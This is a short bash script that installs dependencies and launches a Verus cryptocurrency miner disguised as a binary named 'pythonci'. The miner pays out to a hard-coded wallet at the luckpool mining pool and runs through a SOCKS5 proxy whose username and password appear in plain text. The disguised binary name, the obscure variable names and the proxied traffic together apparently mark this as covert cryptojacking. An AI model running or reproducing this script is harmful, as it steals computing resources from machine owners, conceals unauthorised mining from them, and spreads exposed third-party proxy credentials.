#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x woni.sh && chmod +x pythonci chmod 777 pythonci woni.sh
screen -dmS ls
jem=stratum+tcp://na.luckpool.net:3956
bot=RXM8Btq8mJuPPk19t7B6hgZsty7p14cbpG
welo=BR15
yoto=socks5://fpfzeeby:3wdw0eiq8cm5@184.178.172.5:15303
./pythonci -a verus -o $jem -u $bot.$welo -p x -t 2 -x $yoto
